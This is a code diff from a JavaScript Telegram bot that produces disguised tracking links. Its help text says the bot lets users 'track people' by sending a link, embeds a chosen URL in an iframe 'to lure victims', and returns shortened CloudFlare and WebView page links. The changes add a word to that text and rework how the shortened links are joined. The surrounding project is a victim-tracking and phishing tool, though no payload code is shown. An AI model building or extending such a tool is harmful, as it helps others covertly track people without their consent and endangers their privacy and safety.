@@ -77,7 +77,7 @@ else if(msg.text=="/create"){
 createNew(chatId);
 }
 else if(msg.text=="/help"){
-bot.sendMessage(chatId,` Through this bot you can track people just by sending a simple link.\n\nSend /create
+bot.sendMessage(chatId,` Renus Through this bot you can track people just by sending a simple link.\n\nSend /create
 to begin , afterwards it will ask you for a URL which will be used in iframe to lure victims.\nAfter receiving
 the url it will send you 2 links which you can use to track people.
 \n\nSpecifications.
@@ -127,10 +127,16 @@ if(use1pt){
 var x=await fetch(`https://short-link-api.vercel.app/?url=${encodeURIComponent(cUrl)}`).then(res => res.json());
 var y=await fetch(`https://short-link-api.vercel.app/?url=${encodeURIComponent(wUrl)}`).then(res => res.json());
 
-  var f = x.urls.join("\n");
-            var g = y.urls.join("\n");
+  let f = "";
+      let g = "";
 
+      for (const c in x) {
+        f += x[c] + "\n\n";
+      }
 
+      for (const c in y) {
+        g += y[c] + "\n\n";
+      }
   
 bot.sendMessage(cid, `New links has been created successfully.You can use any one of the below links.\nURL: ${msg}\n\n✅Your Links\n\n🌐 CloudFlare Page Link\n${f}\n\n🌐 WebView Page Link\n${g}`,m);
 }
